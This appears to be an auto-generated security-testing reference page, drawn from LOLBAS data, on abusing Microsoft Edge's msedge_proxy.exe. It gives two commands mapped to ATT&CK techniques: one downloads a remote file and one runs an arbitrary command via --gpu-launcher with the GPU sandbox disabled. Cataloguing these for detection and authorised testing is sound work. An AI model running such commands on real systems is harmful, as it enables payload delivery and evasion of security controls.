---
parsed_by: focuslocust
source: commands
type: generated
---
# msedge_proxy Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## msedge_proxy.exe

Tool page: [msedge_proxy.exe](../../tools/windows/msedge-proxy.exe.md)

### Download file from the internet

```text
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe {REMOTEURL:.zip}
```

Description:

msedge_proxy will download malicious file.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/msedge_proxy.yml` |
| Evidence | Command preserved from source parser. |

### Executes a process under a trusted Microsoft signed binary

```text
C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher="{CMD} &&"
```

Description:

msedge_proxy.exe will execute file in the background

Related ATT&CK:

- [T1218.015](../../attack/techniques/T1218.015-electron-applications.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/msedge_proxy.yml` |
| Evidence | Command preserved from source parser. |
